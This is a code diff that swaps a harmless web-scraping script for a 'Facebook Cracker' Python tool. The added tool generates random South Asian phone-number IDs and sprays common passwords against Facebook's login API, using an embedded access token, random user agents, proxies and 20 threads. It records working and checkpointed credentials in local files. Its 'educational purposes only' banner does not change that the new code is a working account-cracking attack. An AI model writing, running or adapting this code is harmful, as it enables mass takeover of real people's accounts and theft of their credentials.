@@ -1,133 +1,148 @@
-import requests
-from bs4 import BeautifulSoup
-import pandas as pd
-from selenium import webdriver
-from selenium.webdriver.common.by import By
-from selenium.webdriver.chrome.service import Service
-from concurrent.futures import ThreadPoolExecutor
+#----------------------------[IMPORTS]--------------------------------#
+import requests, json, os, sys, random, datetime, time, re
+from bs4 import BeautifulSoup as bs
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import socket
 import logging
-from cryptography.fernet import Fernet
-import json
-import time
-import os
 
-# Set up logging
-logging.basicConfig(filename='advanced_script.log', level=logging.INFO, 
-                    format='%(asctime)s - %(levelname)s - %(message)s')
+#----------------------------[COLORS]--------------------------------#
+A = '\x1b[1;97m'; R = '\x1b[38;5;196m'; G = '\x1b[38;5;46m'
+B = '\x1b[38;5;8m'; Y = '\033[1;33m'; X = '\33[1;34m'; S = '\x1b[1;96m'
 
-# Encryption key for sensitive data
-ENCRYPTION_KEY = Fernet.generate_key()
-cipher_suite = Fernet(ENCRYPTION_KEY)
+#----------------------------[DATE & TIME]--------------------------------#
+now = datetime.datetime.now()
+current_time = now.strftime("%H:%M:%S")
+current_date = now.strftime("%d-%B-%Y")
 
-# Function to encrypt data
-def encrypt_data(data):
-    return cipher_suite.encrypt(data.encode())
-
-# Function to decrypt data
-def decrypt_data(encrypted_data):
-    return cipher_suite.decrypt(encrypted_data).decode()
-
-# Function to scrape data from a website
-def scrape_website(url):
+#----------------------------[IP ADDRESS]--------------------------------#
+def get_ip():
     try:
-        response = requests.get(url)
-        response.raise_for_status()
-        soup = BeautifulSoup(response.text, 'html.parser')
-        titles = [title.text for title in soup.find_all('h2')]
-        logging.info(f"Scraped {len(titles)} titles from {url}")
-        return titles
-    except Exception as e:
-        logging.error(f"Error scraping {url}: {e}")
-        return []
+        return requests.get("https://api64.ipify.org?format=json").json()["ip"]
+    except:
+        return "No Internet"
 
-# Function to interact with an API
-def fetch_api_data(api_url):
+#----------------------------[LOGO]--------------------------------#
+logo = f"""
+{G}      ANONYMOUS CYBER
+{A}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+{Y}  Developer : Abd Ur Rab
+{Y}  Tool Name : Facebook Cracker
+{Y}  Version   : 2.0
+{Y}  Status    : Active
+{Y}  Date      : {current_date}
+{Y}  Time      : {current_time}
+{Y}  IP        : {get_ip()}
+{A}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+{Y}  NOTE: This tool is for educational purposes only.
+{Y}  Do not use it for illegal activities.
+{A}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+"""
+
+#----------------------------[COUNTRY SELECTION]--------------------------------#
+def select_country():
+    os.system("clear")
+    print(logo)
+    print(f"{G}[1] {A}Pakistan")
+    print(f"{G}[2] {A}Afghanistan")
+    print(f"{G}[3] {A}India")
+    print(f"{G}[4] {A}Bangladesh")
+    print(f"{G}[5] {A}Exit")
+    
+    choice = input(f"{G}Select Country: {A}")
+    
+    if choice == "1":
+        return "PAK", "923"
+    elif choice == "2":
+        return "AFG", "937"
+    elif choice == "3":
+        return "IND", "91"
+    elif choice == "4":
+        return "BD", "880"
+    elif choice == "5":
+        exit()
+    else:
+        print(f"{R}Invalid Choice! Try Again...")
+        time.sleep(2)
+        return select_country()
+
+#----------------------------[USER-AGENT]--------------------------------#
+def random_ua():
+    return f"Mozilla/5.0 (Linux; Android {random.randint(7,12)}; SM-G{random.randint(900,999)}F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(80,115)}.0.{random.randint(4000,5000)}.0 Mobile Safari/537.36"
+
+#----------------------------[PROXY SUPPORT]--------------------------------#
+PROXIES = [
+    "http://proxy1:port",
+    "http://proxy2:port",
+    "http://proxy3:port"
+]
+
+def get_random_proxy():
+    return random.choice(PROXIES) if PROXIES else None
+
+#----------------------------[FACEBOOK LOGIN]--------------------------------#
+def facebook_login(uid, password):
+    headers = {
+        "User-Agent": random_ua(),
+        "Accept-Language": "en-US,en;q=0.9",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "X-FB-HTTP-Engine": "Liger"
+    }
+    
+    proxy = get_random_proxy()
+    proxies = {"http": proxy, "https": proxy} if proxy else None
+    
+    url = f"https://b-api.facebook.com/method/auth.login?email={uid}&password={password}&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
+    
     try:
-        response = requests.get(api_url)
-        response.raise_for_status()
-        data = response.json()
-        logging.info(f"Fetched data from API: {api_url}")
-        return data
+        session = requests.Session()
+        response = session.get(url, headers=headers, proxies=proxies).json()
+        
+        if "session_key" in response:
+            print(f"{G}[SUCCESS] {uid} | {password}")
+            open("success.txt", "a").write(uid + "|" + password + "\n")
+        elif "www.facebook.com" in response.get("error_msg", ""):
+            print(f"{Y}[CHECKPOINT] {uid} | {password}")
+            open("checkpoint.txt", "a").write(uid + "|" + password + "\n")
+        else:
+            print(f"{R}[FAILED] {uid} | {password}")
+            
+    except requests.exceptions.ConnectionError:
+        print(f"{R}No Internet Connection!")
     except Exception as e:
-        logging.error(f"Error fetching API data: {e}")
-        return {}
+        print(f"{R}[ERROR] {uid} | {password} - {e}")
 
-# Function to automate browser tasks using Selenium
-def automate_browser(url):
-    try:
-        options = webdriver.ChromeOptions()
-        options.add_argument('--headless')  # Run in headless mode
-        service = Service(executable_path='/path/to/chromedriver')  # Update with your chromedriver path
-        driver = webdriver.Chrome(service=service, options=options)
-        driver.get(url)
-        time.sleep(3)  # Wait for page to load
-        element = driver.find_element(By.TAG_NAME, 'h1')
-        logging.info(f"Automated browser fetched element: {element.text}")
-        driver.quit()
-        return element.text
-    except Exception as e:
-        logging.error(f"Error automating browser: {e}")
-        return None
-
-# Function to process data using pandas
-def process_data(data):
-    try:
-        df = pd.DataFrame(data, columns=['Title'])
-        df['Length'] = df['Title'].apply(len)
-        logging.info("Processed data using pandas")
-        return df
-    except Exception as e:
-        logging.error(f"Error processing data: {e}")
-        return pd.DataFrame()
-
-# Function to save data to a file
-def save_data(data, filename):
-    try:
-        if filename.endswith('.csv'):
-            data.to_csv(filename, index=False)
-        elif filename.endswith('.json'):
-            with open(filename, 'w') as f:
-                json.dump(data, f)
-        logging.info(f"Data saved to {filename}")
-    except Exception as e:
-        logging.error(f"Error saving data to {filename}: {e}")
-
-# Main function to run all tasks
+#----------------------------[MAIN FUNCTION]--------------------------------#
 def main():
-    # URLs and API endpoints
-    website_url = 'https://example.com'
-    api_url = 'https://api.example.com/data'
-    browser_url = 'https://example.com'
+    os.system("clear")
+    print(logo)
+    
+    country_code, prefix = select_country()
+    
+    limit = int(input(f"{G}Enter Number of IDs to Generate: {A}"))
+    
+    user_ids = []
+    for _ in range(limit):
+        user_ids.append(prefix + str(random.randint(1000000, 9999999)))
 
-    # Scrape website data
-    scraped_data = scrape_website(website_url)
+    passwords = ["123456", "password", "pakistan", "786786", "112233"]
+    
+    os.system("clear")
+    print(logo)
+    print(f"{G}Total IDs: {A}{limit}")
+    print(f"{G}Cracking Started... Please Wait!")
+    
+    with ThreadPoolExecutor(max_workers=20) as executor:
+        futures = []
+        for uid in user_ids:
+            for pw in passwords:
+                futures.append(executor.submit(facebook_login, uid, pw))
+        
+        for future in as_completed(futures):
+            try:
+                future.result()
+            except Exception as e:
+                print(f"{R}[ERROR] {e}")
 
-    # Fetch API data
-    api_data = fetch_api_data(api_url)
-
-    # Automate browser tasks
-    browser_data = automate_browser(browser_url)
-
-    # Process scraped data
-    processed_data = process_data({'Title': scraped_data})
-
-    # Save processed data to a CSV file
-    save_data(processed_data, 'output.csv')
-
-    # Encrypt sensitive data
-    sensitive_data = "This is a secret message."
-    encrypted_data = encrypt_data(sensitive_data)
-    logging.info(f"Encrypted data: {encrypted_data}")
-
-    # Decrypt sensitive data
-    decrypted_data = decrypt_data(encrypted_data)
-    logging.info(f"Decrypted data: {decrypted_data}")
-
-    # Use multithreading for parallel tasks
-    with ThreadPoolExecutor(max_workers=3) as executor:
-        executor.submit(scrape_website, website_url)
-        executor.submit(fetch_api_data, api_url)
-        executor.submit(automate_browser, browser_url)
-
+#----------------------------[START]--------------------------------#
 if __name__ == "__main__":
     main()
